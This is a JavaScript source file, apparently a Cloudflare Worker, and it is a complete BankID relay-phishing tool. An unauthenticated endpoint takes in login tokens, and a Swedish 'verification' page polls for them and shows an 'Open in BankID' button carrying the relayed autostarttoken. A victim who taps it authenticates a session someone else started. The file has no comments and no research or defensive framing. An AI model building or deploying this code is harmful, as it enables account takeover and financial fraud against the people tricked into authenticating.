export default {
  async fetch(req, env) {
    const [, kind, id] = new URL(req.url).pathname.split("/");

    if (kind === "v") {
      return new Response(page(id), {
        headers: { "content-type": "text/html;charset=utf-8" }
      });
    }

    if (kind === "push") {
      const room = env.ROOM.get(env.ROOM.idFromName(id));
      await room.fetch("https://do/push", {
        method: "POST",
        body: await req.text()
      });
      return new Response("ok");
    }

    if (kind === "state") {
      const room = env.ROOM.get(env.ROOM.idFromName(id));
      const r = await room.fetch("https://do/state");
      return new Response(r.body, {
        headers: { "content-type": "application/json" }
      });
    }

    return new Response("relay");
  }
};

export class Room {
  constructor(state) { this.state = state; this.cur = null; }

  async fetch(req) {
    const path = new URL(req.url).pathname;

    if (path === "/push") {
      this.cur = JSON.parse(await req.text());
      await this.state.storage.put("cur", this.cur);
      return new Response("ok");
    }

    if (path === "/state") {
      const c = this.cur ?? await this.state.storage.get("cur");
      return Response.json(c ?? { state: "idle" });
    }

    return new Response("?");
  }
}

function page(id) {
  return `<!doctype html>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Din verifiering</title>
<style>
  body{font-family:system-ui;display:grid;place-items:center;
       min-height:100vh;margin:0;background:#fafafa;color:#111}
  .c{text-align:center;padding:24px;max-width:320px}
  .b{display:none;margin-top:20px;padding:16px 22px;border:1px solid #111;
     border-radius:12px;font-size:17px;text-decoration:none;color:#111}
  .s{color:#666;font-size:14px;margin-top:10px}
</style>
<div class=c>
  <h2 id=m>Väntar…</h2>
  <a class=b id=o>Öppna i BankID</a>
  <p class=s id=s>Stäng inte sidan.</p>
</div>
<script>
  const ID = "${id}";
  let shown = null;

  async function tick() {
    try {
      const r = await fetch("/state/" + ID, { cache: "no-store" });
      const d = await r.json();
      if (d.state === "ready" && d.token !== shown) {
        shown = d.token;
        m.textContent = d.service + " väntar på dig";
        o.href = "bankid:///?autostarttoken=" + d.token +
          "&redirect=" + encodeURIComponent(location.href);
        o.style.display = "block";
        s.textContent = "Tryck för att öppna BankID.";
      }
    } catch (e) {}
  }

  tick();
  setInterval(tick, 1500);
</script>`;
}
